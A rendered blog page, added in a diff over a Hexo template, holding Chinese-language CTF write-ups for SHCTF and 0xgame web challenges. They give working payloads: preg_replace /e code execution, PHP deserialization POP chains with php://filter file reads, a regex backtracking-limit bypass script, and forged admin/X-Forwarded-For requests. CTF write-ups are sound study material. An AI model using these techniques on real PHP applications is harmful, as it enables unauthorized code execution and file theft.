@@ -1,37 +1,1166 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="练习赛," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SHCTF[WEEK1]飞机大战查看js，发现分数要大于99999，所以转到控制器  修改分数点击回车后，点击开始游戏就会弹出flag   法二：直接在js中发现won函数，里面的unicode编码解码后就是flag  [WEEK1]ezphp123456789101112131415161718 &lt;?phperror_reporting(0);if(isset($_GET[&#x27;co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SHCTF&amp;0xgame">
+<meta property="og:url" content="http://example.com/SHCTF&0xgame.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="SHCTF[WEEK1]飞机大战查看js，发现分数要大于99999，所以转到控制器  修改分数点击回车后，点击开始游戏就会弹出flag   法二：直接在js中发现won函数，里面的unicode编码解码后就是flag  [WEEK1]ezphp123456789101112131415161718 &lt;?phperror_reporting(0);if(isset($_GET[&#x27;co">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231006131627245.png">
+<meta property="og:image" content="http://example.com/img/image-20231006131558566.png">
+<meta property="og:image" content="http://example.com/img/image-20231006131759294.png">
+<meta property="og:image" content="http://example.com/img/image-20231006131912160.png">
+<meta property="og:image" content="http://example.com/img/image-20231006144747769.png">
+<meta property="og:image" content="http://example.com/img/image-20231006153514460.png">
+<meta property="og:image" content="http://example.com/img/image-20231011114101333.png">
+<meta property="og:image" content="http://example.com/img/image-20231011114947899.png">
+<meta property="og:image" content="http://example.com/img/image-20231102114828021.png">
+<meta property="og:image" content="http://example.com/img/image-20231102114924326.png">
+<meta property="og:image" content="http://example.com/img/image-20231102115001804.png">
+<meta property="og:image" content="http://example.com/img/image-20231102115032865.png">
+<meta property="og:image" content="http://example.com/img/image-20231001110256175.png">
+<meta property="og:image" content="http://example.com/img/image-20231001105621221.png">
+<meta property="article:published_time" content="2023-10-06T05:12:22.000Z">
+<meta property="article:modified_time" content="2023-11-02T04:51:21.681Z">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="练习赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/image-20231006131627245.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/SHCTF&0xgame.html"/>
+
+
+
+
+
+  <title>SHCTF&0xgame | yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nanashi</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/SHCTF&0xgame.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SHCTF&0xgame</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-06T13:12:22+08:00">
+                2023-10-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SHCTF"><a href="#SHCTF" class="headerlink" title="SHCTF"></a>SHCTF</h1><h2 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2><p>查看js，发现分数要大于99999，所以转到控制器</p>
+<p><img src="/img/image-20231006131627245.png" alt="image-20231006131627245"></p>
+<p>修改分数点击回车后，点击开始游戏就会弹出flag</p>
+<p><img src="/img/image-20231006131558566.png" alt="image-20231006131558566"></p>
+<p><img src="/img/image-20231006131759294.png" alt="image-20231006131759294"></p>
+<p>法二：直接在js中发现won函数，里面的unicode编码解码后就是flag</p>
+<p><img src="/img/image-20231006131912160.png" alt="image-20231006131912160"></p>
+<h2 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pattern</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i&quot;</span>,<span class="variable">$code</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$pattern</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;print_r(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are smart&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;it is begin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">it is begin</span><br></pre></td></tr></table></figure>
+
+<p>重点代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $pattern . &#x27;)/ei&#x27;,&#x27;print_r(&quot;\\1&quot;)&#x27;, $code);</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?code=$&#123;phpinfo()&#125; HTTP/1.1</span><br><span class="line">pattern=\S*</span><br></pre></td></tr></table></figure>
+
+<p>自己理解：正则匹配模式设置为：匹配输入字符串中的连续非空白字符序列，所以匹配到了${phpinfo()}，<code>\\1</code>捕获了该字符串，又由于是&#x2F;e模式：表示替换字符串中的匹配部分将被视为 PHP 代码，并执行它，所以<code>print_r(&quot;$&#123;phpinfo()&#125;&quot;)</code>被执行<br>在环境中找到flag<br><img src="/img/image-20231006144747769.png" alt="image-20231006144747769"></p>
+<h2 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;z = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;q = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;./index.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>];</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no number!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="variable">$code</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no touch!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;2023SHCTF&#x27;</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what do you want&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>绕过<code>if(preg_match(&quot;/[0-9]/&quot;, $num))</code>:因为preg_match第二个参数必须是string类型，当我们传入数组num[]&#x3D;1时，preg_match函数会报错，返回false。而后面intval函数的第一个参数是mixed：接受多种不同的数据类型，所以返回的是1，进入内层if。</p>
+<p><code>if(preg_match(&#39;/.+?SHCTF/is&#39;, $code))</code>绕过：字符串数量超过1000000时，preg_match函数会挂掉，后面再接上payload就不会被匹配到，上脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;very&quot;</span>*<span class="number">250000</span>+<span class="string">&quot;2023SHCTF&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/?num[]=1&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://112.6.51.212:30458&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;c[ode&#x27;</span>:code          <span class="comment">#这边[到php当中会被当做_</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url+payload,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231006153514460.png" alt="image-20231006153514460"></p>
+<h2 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h2><p><img src="/img/image-20231011114101333.png" alt="image-20231011114101333"></p>
+<p>我们需要知道最后要的include在milaoshu类里，我们开始反推，<code>$this-&gt;gao=$this-&gt;fei;</code>把milaoshu赋给$this-&gt;fei触发<code>__tostring()</code>，然后musca中的<code>return $this-&gt;ding-&gt;dong; </code>把misca赋给<code>$this-&gt;ding</code>触发<code>_get</code>,到达__wakeup()，执行unserialize()时，先会调用这个函数，即到达入口。</p>
+<p>整个逻辑是传入序列化后的payload，反序列化的时候触发__wakeup()，然后到get再到tostring()，非常清晰。<br>数组绕过check，但是发现</p>
+<p><img src="/img/image-20231011114947899.png" alt="image-20231011114947899"></p>
+<p>这是因为get中调用了miaomiao，把Mikey Mouse~赋值给了成员属性$a,而后面的die括号中是$a,即终止程序并输出括号里的值作为报错信息，不管别的，这里没有输出include+伪协议的内容，那么我们就想到把报错信息改成伪协议读取。$this-&gt;gao&#x3D;$this-&gt;fei;触发的tostring，就添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct()&#123;</span><br><span class="line">    $this-&gt;a=&amp;$this-&gt;gao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wanna[fl.ag=a:1:&#123;i:0;O:5:&quot;musca&quot;:2:&#123;s:4:&quot;ding&quot;;O:5:&quot;misca&quot;:3:&#123;s:3:&quot;gao&quot;;N;s:3:&quot;fei&quot;;O:8:&quot;milaoshu&quot;:1:&#123;s:1:&quot;v&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;s:1:&quot;a&quot;;R:4;&#125;s:4:&quot;dong&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意参数中的_要改成[</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class misca&#123;</span><br><span class="line">    public $gao;</span><br><span class="line">    public $fei;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a=&amp;$this-&gt;gao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class musca&#123;</span><br><span class="line">    public $ding;</span><br><span class="line">    public $dong;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class milaoshu&#123;</span><br><span class="line">    public $v=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new misca();</span><br><span class="line">$b = new musca();</span><br><span class="line">$c = new milaoshu();</span><br><span class="line">$a-&gt;fei = $c;</span><br><span class="line">$b-&gt;ding = $a;</span><br><span class="line">echo serialize(array($b));</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">API：url/generate_invitation  </span><br><span class="line">Request：POST application/json  </span><br><span class="line">Body：&#123;  </span><br><span class="line">    &quot;name&quot;: &quot;Yourname&quot;,  </span><br><span class="line">    &quot;imgurl&quot;: &quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>根据题目要求直接改包</p>
+<p><img src="/img/image-20231102114828021.png" alt="image-20231102114828021"></p>
+<p>这样看是有数据的</p>
+<p><img src="/img/image-20231102114924326.png" alt="image-20231102114924326"></p>
+<p>放包，下载下来一个图片</p>
+<p><img src="/img/image-20231102115001804.png" alt="image-20231102115001804">****</p>
+<p><img src="/img/image-20231102115032865.png" alt="image-20231102115032865"></p>
+<h2 id="0xgame"><a href="#0xgame" class="headerlink" title="0xgame"></a>0xgame</h2><p>###[Week 1] signin </p>
+<p><img src="/img/image-20231001110256175.png" alt="image-20231001110256175"></p>
+<h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=QNKCDZO&amp;b=s878926199a HTTP/1.1</span><br><span class="line">Host: 120.27.148.152:50014</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line">Origin: http://120.27.148.152:50014</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: name=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">Referer: http://120.27.148.152:50014/?a=QNKCDZO&amp;b=s878926199a</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">c=1024.1a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231001105621221.png" alt="image-20231001105621221"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?query=ctf HTTP/1.1</span><br><span class="line">Host: 120.27.148.152:50012</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: role=admin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 14</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">action=getflag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E7%BB%83%E4%B9%A0%E8%B5%9B/" rel="tag"># 练习赛</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/OtterCTF%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81wp.html" rel="next" title="OtterCTF内存取证wp">
+                <i class="fa fa-chevron-left"></i> OtterCTF内存取证wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/%E5%88%B7%E9%A2%98.html" rel="prev" title="刷题">
+                刷题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
